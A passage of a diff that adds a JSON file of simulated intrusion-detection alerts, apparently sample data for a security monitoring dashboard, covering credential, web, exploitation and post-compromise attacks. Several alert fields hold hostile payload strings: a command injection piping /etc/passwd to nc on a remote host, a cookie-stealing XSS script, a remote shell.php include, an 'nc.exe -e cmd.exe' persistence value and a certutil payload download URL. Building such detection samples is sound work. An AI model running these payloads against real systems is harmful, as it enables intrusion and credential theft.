+      "ntlm_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+      "target_user": "Administrator"
+    }
+  },
+  "DICT_ATTACK": {
+    "name": "RDP Dictionary Attack Common Password Wordlist",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 87,
+    "dst_port": 3389,
+    "protocol": "RDP",
+    "src_ip": "203.0.113.88",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET CREDENTIAL RDP Dictionary Attack Rockyou Wordlist (> 200 failures)",
+    "raw_event": {
+      "wordlist": "rockyou.txt",
+      "attempts": 8642,
+      "tool": "ncrack"
+    }
+  },
+  "CRED_THEFT": {
+    "name": "Mimikatz LSASS Memory Credential Dumping",
+    "category": "credential",
+    "severity": "CRITICAL",
+    "risk_score": 98,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "10.240.15.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET CREDENTIAL Mimikatz sekurlsa::logonpasswords LSASS Credential Dump",
+    "raw_event": {
+      "tool": "mimikatz 2.2.0",
+      "command": "sekurlsa::logonpasswords",
+      "hashes_extracted": 14
+    }
+  },
+  "PASS_TICKET": {
+    "name": "Kerberos Pass-the-Ticket Golden Ticket Forge",
+    "category": "credential",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 88,
+    "protocol": "Kerberos",
+    "src_ip": "10.240.15.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET CREDENTIAL Pass-the-Ticket Golden Ticket Kerberos TGT Forgery",
+    "raw_event": {
+      "ticket_type": "Golden Ticket",
+      "krbtgt_hash_used": true,
+      "valid_days": 10
+    }
+  },
+  "ASREP_ROAST": {
+    "name": "AS-REP Roasting No-Preauthentication Account Harvest",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 89,
+    "dst_port": 88,
+    "protocol": "Kerberos",
+    "src_ip": "10.240.15.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET CREDENTIAL AS-REP Roasting Preauthentication Disabled Account TGT Request",
+    "raw_event": {
+      "accounts_targeted": 5,
+      "encryption": "RC4-HMAC",
+      "tool": "Rubeus AS-REP roast"
+    }
+  },
+  "MFA_FATIGUE": {
+    "name": "Multi-Factor Authentication Fatigue Push Bombing",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 88,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.15",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET CREDENTIAL MFA Fatigue Attack -- Repeated Push Notification Spam (Approval Coercion)",
+    "raw_event": {
+      "push_count": 47,
+      "target_user": "j.smith@corp.com",
+      "elapsed_minutes": 32
+    }
+  },
+  "AUTH_BYPASS": {
+    "name": "Authentication Bypass JWT None Algorithm",
+    "category": "credential",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.55",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET POLICY JWT Authentication Bypass None Algorithm Attack",
+    "raw_event": {
+      "jwt_alg": "none",
+      "target_endpoint": "/api/admin/users",
+      "bypassed": true
+    }
+  },
+  "SESSION_TOKEN_THEFT": {
+    "name": "XSS-Exfiltrated Session Token Cookie Theft",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 90,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.80",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_CLIENT Session Cookie Theft via XSS Beacon (Unauthorized Session Reuse)",
+    "raw_event": {
+      "cookie_name": "session_id",
+      "exfil_to": "attacker.com/steal",
+      "httponly": false
+    }
+  },
+  "OAUTH_ABUSE": {
+    "name": "OAuth 2.0 Token Abuse Implicit Flow Hijack",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 89,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.66",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET POLICY OAuth Token Abuse Stolen Bearer Access Token API Abuse",
+    "raw_event": {
+      "grant_type": "implicit",
+      "stolen_token": "ya29.a0AfH...",
+      "scope": "admin:read write"
+    }
+  },
+  "DEFAULT_CRED": {
+    "name": "Default Vendor Credential Login on Network Device",
+    "category": "credential",
+    "severity": "CRITICAL",
+    "risk_score": 93,
+    "dst_port": 23,
+    "protocol": "Telnet",
+    "src_ip": "203.0.113.120",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET CREDENTIAL Default Credential Login Success -- admin:admin on Network Device",
+    "raw_event": {
+      "username": "admin",
+      "password": "admin",
+      "device": "Cisco Router IOS"
+    }
+  },
+  "CRED_PHISHING": {
+    "name": "Spear Phishing Credential Harvesting Page",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 87,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "91.108.56.45",
+    "dst_ip": "10.240.15.33",
+    "signature": "ET PHISHING Credential Harvest Page Detected -- Microsoft O365 Login Clone",
+    "raw_event": {
+      "phishing_domain": "login-microsoft365-secure.com",
+      "target_user": "ceo@corp.com",
+      "clicked": true
+    }
+  },
+  "CSRF": {
+    "name": "Cross-Site Request Forgery State Manipulation",
+    "category": "web_api",
+    "severity": "MEDIUM",
+    "risk_score": 86,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.44",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS CSRF Forged Authenticated POST Request (No Anti-CSRF Token)",
+    "raw_event": {
+      "target": "/api/user/change-email",
+      "referer": "http://malicious.com",
+      "missing_token": true
+    }
+  },
+  "CMD_INJECT": {
+    "name": "OS Command Injection via API Endpoint",
+    "category": "web_api",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.88",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER OS Command Injection Shell Operator in HTTP POST Body",
+    "raw_event": {
+      "payload": "host=127.0.0.1; cat /etc/passwd | nc 185.220.101.88 4444",
+      "endpoint": "/api/ping"
+    }
+  },
+  "SSRF": {
+    "name": "Cloud IMDSv1 Server-Side Request Forgery",
+    "category": "web_api",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.55",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER SSRF Cloud Metadata Service Access (169.254.169.254) via App",
+    "raw_event": {
+      "url_requested": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "iam_keys": true
+    }
+  },
+  "XXE": {
+    "name": "XML External Entity (XXE) File Ingestion",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 94,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "91.240.118.90",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS XXE XML External Entity DOCTYPE SYSTEM File Read",
+    "raw_event": {
+      "xxe_entity": "file:///etc/passwd",
+      "file_read": true,
+      "response_included": true
+    }
+  },
+  "BLIND_SQLI": {
+    "name": "Blind SQL Injection Boolean-Based Extraction",
+    "category": "web_api",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.77",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS Blind SQL Injection Boolean-Based Response Time Attack",
+    "raw_event": {
+      "technique": "Boolean-based blind",
+      "payload": "1' AND SLEEP(5)--",
+      "data_inferred": true
+    }
+  },
+  "STORED_XSS": {
+    "name": "Persistent Stored XSS Payload in Comment Field",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 91,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.55",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS Stored XSS Payload Persisted in Database Comment Field",
+    "raw_event": {
+      "stored_in": "comments.body",
+      "payload": "<script>document.location='http://xss.rocks/'+document.cookie</script>"
+    }
+  },
+  "REFLECTED_XSS": {
+    "name": "Reflected XSS URL Parameter Injection",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 86,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.33",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS Reflected XSS in URI Parameter -- Script Tag Injection",
+    "raw_event": {
+      "param": "q",
+      "payload": "<script>alert(document.domain)</script>",
+      "reflected": true
+    }
+  },
+  "PATH_TRAVERSAL": {
+    "name": "Directory Traversal ../etc/passwd Read",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 88,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.77",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER Path Traversal Directory Traversal ../../etc/passwd Access",
+    "raw_event": {
+      "uri": "/api/files/../../etc/passwd",
+      "file_read": "/etc/passwd",
+      "encoded": true
+    }
+  },
+  "FILE_INCLUSION": {
+    "name": "Local File Inclusion via Parameter Injection",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 88,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.66",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS File Inclusion Vulnerability Exploit LFI/RFI Attempt",
+    "raw_event": {
+      "param": "page",
+      "payload": "../../../../etc/passwd",
+      "null_byte": true
+    }
+  },
+  "RFI": {
+    "name": "Remote File Inclusion PHP Wrapper Exploit",
+    "category": "web_api",
+    "severity": "CRITICAL",
+    "risk_score": 94,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.55",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER Remote File Inclusion PHP Wrapper http:// External Payload",
+    "raw_event": {
+      "param": "page",
+      "payload": "http://attacker.com/shell.php",
+      "executed": true
+    }
+  },
+  "LFI": {
+    "name": "Local File Inclusion /proc/self/environ Exploit",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 91,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.44",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER LFI /proc/self/environ Log Poisoning Attempt",
+    "raw_event": {
+      "target_file": "/proc/self/environ",
+      "poisoned_agent": true,
+      "execution": "PHP"
+    }
+  },
+  "INSECURE_DESER": {
+    "name": "Java Deserialization RCE via Serialized Object",
+    "category": "web_api",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.33",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS Insecure Deserialization Java ObjectInputStream RCE Payload",
+    "raw_event": {
+      "magic_bytes": "AC ED 00 05",
+      "gadget_chain": "CommonsCollections6",
+      "rce": true
+    }
+  },
+  "HTTP_SMUGGLING": {
+    "name": "HTTP Request Smuggling TE-CL Desync Attack",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 89,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.88",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER HTTP Request Smuggling TE-CL Desynchronization Attack",
+    "raw_event": {
+      "technique": "TE-CL",
+      "front_end": "HAProxy",
+      "back_end": "nginx",
+      "cache_poisoned": true
+    }
+  },
+  "HTTP_PARAM_POLL": {
+    "name": "HTTP Parameter Pollution Duplicate Key Attack",
+    "category": "web_api",
+    "severity": "MEDIUM",
+    "risk_score": 72,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.22",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER HTTP Parameter Pollution Duplicate Parameter Injection",
+    "raw_event": {
+      "params": "user=admin&user=attacker",
+      "confused_param": "user",
+      "waf_bypass": true
+    }
+  },
+  "WEB_SHELL": {
+    "name": "China Chopper Web Shell Remote Access",
+    "category": "web_api",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "91.108.4.100",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET TROJAN China Chopper Web Shell POST Command Execution (eval base64_decode)",
+    "raw_event": {
+      "shell_path": "/var/www/html/images/thumb.php",
+      "password": "pass",
+      "eval_payload": true
+    }
+  },
+  "API_ABUSE": {
+    "name": "API Rate Limit Bypass Data Scraping Attack",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 84,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.11",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET POLICY API Abuse Rate-Limit Evasion Rotating IPs Bulk Data Extraction",
+    "raw_event": {
+      "requests_per_second": 450,
+      "rotating_ips": true,
+      "data_scraped_mb": 120
+    }
+  },
+  "BROKEN_ACCESS": {
+    "name": "Broken Access Control IDOR Unauthorized Object",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 87,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.44",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SERVER Broken Access Control IDOR -- Horizontal Privilege Escalation",
+    "raw_event": {
+      "endpoint": "/api/users/1/profile",
+      "attacker_uid": 2,
+      "accessed_uid": 1,
+      "idor": true
+    }
+  },
+  "BUFFER_OVERFLOW": {
+    "name": "Stack-Based NOP Sled Buffer Overflow Shellcode",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 445,
+    "protocol": "TCP",
+    "src_ip": "193.142.58.19",
+    "dst_ip": "10.240.10.20",
+    "signature": "ET EXPLOIT Stack Buffer Overflow NOP Sled EIP Overwrite Shellcode Execution",
+    "raw_event": {
+      "offset": 1024,
+      "eip_overwrite": "0x41414141",
+      "shellcode_len": 345
+    }
+  },
+  "PRIV_ESC": {
+    "name": "Linux SUID Binary Local Privilege Escalation",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 0,
+    "protocol": "LOCAL",
+    "src_ip": "10.240.15.55",
+    "dst_ip": "10.240.15.55",
+    "signature": "ET EXPLOIT Linux SUID GTFOBin Privilege Escalation Root Shell Spawn",
+    "raw_event": {
+      "binary": "/usr/bin/find",
+      "technique": "GTFOBins",
+      "result_uid": 0
+    }
+  },
+  "ZERO_DAY": {
+    "name": "Polymorphic Zero-Day Vector (AI Behavioral Detection)",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 99,
+    "dst_port": 8443,
+    "protocol": "TLS",
+    "src_ip": "193.142.58.99",
+    "dst_ip": "10.240.10.99",
+    "signature": "ET EXPLOIT Zero-Day Polymorphic Binary Anomaly -- AI Entropy Behavioral Block",
+    "raw_event": {
+      "entropy": 7.95,
+      "signature_match": false,
+      "ai_detected": true,
+      "cve": "CVE-2026-UNKNOWN"
+    }
+  },
+  "DLL_HIJACK": {
+    "name": "DLL Search Order Hijacking via Trusted Executable",
+    "category": "exploitation",
+    "severity": "HIGH",
+    "risk_score": 91,
+    "dst_port": 0,
+    "protocol": "LOCAL",
+    "src_ip": "10.240.15.77",
+    "dst_ip": "10.240.15.77",
+    "signature": "ET EXPLOIT DLL Hijacking -- Malicious DLL Placed in Trusted Application Directory",
+    "raw_event": {
+      "dll": "version.dll",
+      "app_dir": "C:\\Program Files\\TrustedApp\\",
+      "executed_as": "SYSTEM"
+    }
+  },
+  "REMOTE_PRIV_ESC": {
+    "name": "Remote Privilege Escalation via Service Misconfiguration",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "185.220.101.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET EXPLOIT Remote Privilege Escalation Writable Service Path EoP",
+    "raw_event": {
+      "writable_path": "C:\\Program Files\\VulnService\\",
+      "replaced_binary": true,
+      "nt_authority": true
+    }
+  },
+  "HEAP_OVERFLOW": {
+    "name": "Heap Spray Browser Use-After-Free Exploit",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.33",
+    "dst_ip": "10.240.15.66",
+    "signature": "ET EXPLOIT Browser Heap Spray Use-After-Free CVE-2023-HEAP Memory Corruption",
+    "raw_event": {
+      "technique": "Heap Spray",
+      "target_browser": "Chrome 119",
+      "freed_chunk_size": 512
+    }
+  },
+  "RACE_CONDITION": {
+    "name": "TOCTOU Race Condition Filesystem Privilege Exploit",
+    "category": "exploitation",
+    "severity": "HIGH",
+    "risk_score": 86,
+    "dst_port": 0,
+    "protocol": "LOCAL",
+    "src_ip": "10.240.15.44",
+    "dst_ip": "10.240.15.44",
+    "signature": "ET EXPLOIT TOCTOU Time-of-Check-Time-of-Use Race Condition -- Symlink Escalation",
+    "raw_event": {
+      "race_window_ms": 3,
+      "symlink_target": "/etc/shadow",
+      "writes": 10000
+    }
+  },
+  "SUPPLY_CHAIN": {
+    "name": "SolarWinds-Style Supply Chain Software Backdoor",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 100,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "45.77.65.33",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET TROJAN Supply Chain Backdoor C2 Communication -- Signed Update Package Trojanized",
+    "raw_event": {
+      "trojanized_package": "vendor-update-v2.3.1.msi",
+      "signed": true,
+      "c2": "avsvmcloud.com"
+    }
+  },
+  "CONTAINER_ESCAPE": {
+    "name": "Docker Container Escape via Privileged Mode",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 0,
+    "protocol": "LOCAL",
+    "src_ip": "10.240.10.55",
+    "dst_ip": "10.240.10.55",
+    "signature": "ET EXPLOIT Docker Container Escape Privileged Flag Host Filesystem Mount",
+    "raw_event": {
+      "privileged": true,
+      "host_mount": "/",
+      "escaped_to_host": true,
+      "cve": "CVE-2024-21626"
+    }
+  },
+  "CLOUD_PRIV_ABUSE": {
+    "name": "AWS IAM Privilege Escalation via Misconfigured Role",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.88",
+    "dst_ip": "169.254.169.254",
+    "signature": "ET CLOUD AWS IAM Role Privilege Escalation -- AssumeRole Chain to AdministratorAccess",
+    "raw_event": {
+      "initial_role": "S3ReadOnly",
+      "escalated_to": "AdministratorAccess",
+      "iam_chain": 3
+    }
+  },
+  "CLOUD_METADATA": {
+    "name": "AWS IMDS v1 Metadata Service Credential Theft",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 80,
+    "protocol": "HTTP",
+    "src_ip": "198.51.100.55",
+    "dst_ip": "169.254.169.254",
+    "signature": "ET CLOUD IMDSv1 Metadata Service Access -- IAM Credentials Extraction via SSRF",
+    "raw_event": {
+      "metadata_path": "/latest/meta-data/iam/security-credentials/ec2-role",
+      "iam_keys_returned": true
+    }
+  },
+  "LATERAL_MOVE": {
+    "name": "PsExec WMI Remote Execution Lateral Movement",
+    "category": "post_compromise",
+    "severity": "HIGH",
+    "risk_score": 94,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "10.240.15.22",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET POST_COMPROMISE Lateral Movement PsExec WMI Remote Command Execution",
+    "raw_event": {
+      "tool": "wmic",
+      "target": "10.240.10.4",
+      "command": "cmd.exe /c powershell -enc ..."
+    }
+  },
+  "PERSISTENCE": {
+    "name": "Registry Run Key Backdoor Persistence Addition",
+    "category": "post_compromise",
+    "severity": "HIGH",
+    "risk_score": 92,
+    "dst_port": 0,
+    "protocol": "LOCAL",
+    "src_ip": "10.240.15.89",
+    "dst_ip": "10.240.15.89",
+    "signature": "ET POST_COMPROMISE Registry Run Key Persistence -- Backdoor AutoRun Installed",
+    "raw_event": {
+      "reg_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value": "nc.exe -e cmd.exe"
+    }
+  },
+  "LOTL": {
+    "name": "CertUtil Living-off-the-Land Binary Payload Download",
+    "category": "post_compromise",
+    "severity": "HIGH",
+    "risk_score": 93,
+    "dst_port": 80,
+    "protocol": "HTTP",
+    "src_ip": "185.220.101.5",
+    "dst_ip": "10.240.15.30",
+    "signature": "ET POST_COMPROMISE LotL CertUtil LOLBin Payload Download (Signed Binary Abuse)",
+    "raw_event": {
+      "lolbin": "certutil.exe",
+      "payload_url": "http://185.220.101.5/beacon.exe",
+      "signed": true
+    }
+  }
+}
